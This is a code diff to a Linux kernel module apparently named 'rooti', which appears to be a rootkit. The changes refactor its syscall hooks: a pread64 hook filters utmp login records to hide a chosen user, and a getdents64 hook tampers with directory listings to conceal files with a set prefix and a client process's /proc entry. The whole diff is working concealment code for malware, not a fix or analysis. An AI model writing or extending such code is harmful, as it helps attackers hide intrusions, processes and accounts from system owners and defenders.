@@ -4,7 +4,6 @@
 #include <linux/types.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
-#include <linux/dirent.h>
 #include <linux/seq_file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
@@ -180,7 +179,7 @@ static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
         if (pid == record->pid && fd == record->fd) {
-            rooti_filter_user_entry(user_buf, count, ROOTI_HIDE_USER);
+            rooti_filter_login_entry(user_buf, count, ROOTI_HIDE_USER);
         }
     }
     return nread;
@@ -212,14 +211,7 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
     }
 
     // Check if the directory FD is of /proc
-    bool is_proc_dir = false;
-    struct rooti_tracked_fd *record;
-    list_for_each_entry(record, &rooti_proc_tracked_fds, head) {
-        if (current->pid == record->pid && fd == record->fd) {
-            is_proc_dir = true;
-            break;
-        }
-    }
+    bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);
 
     // Tamper with the returned records, concealing any files we wish to hide 
     struct linux_dirent64 *curr_record = NULL;
@@ -229,17 +221,13 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
     while (offset < nread) {
         curr_record = (void *)kernel_buf + offset;
         // Check if the current file begins with the defined prefix, or if the filename is the PID of the process to hide
-        if ((is_proc_dir && strncmp(curr_record->d_name, rooti_client_proc.name, NAME_MAX) == 0) ||
-            (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0)) {
-            // Special case where to to hide is is the first element
+        if (
+            (is_proc_dir && strncmp(curr_record->d_name, rooti_client_proc.name, NAME_MAX) == 0) ||
+            (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0)
+        ) {
+            nread = rooti_filter_dir_entry(curr_record, prev_record, nread);
             if (curr_record == kernel_buf) {
-                // Shift the entire buffer to override the current record
-                nread -= curr_record->d_reclen;
-                memmove(curr_record, (void *)curr_record + curr_record->d_reclen, nread);
                 continue;
-            } else {
-                // Increase the size of previous record to override the current record
-                prev_record->d_reclen += curr_record->d_reclen;
             }
         } else {
             prev_record = curr_record;
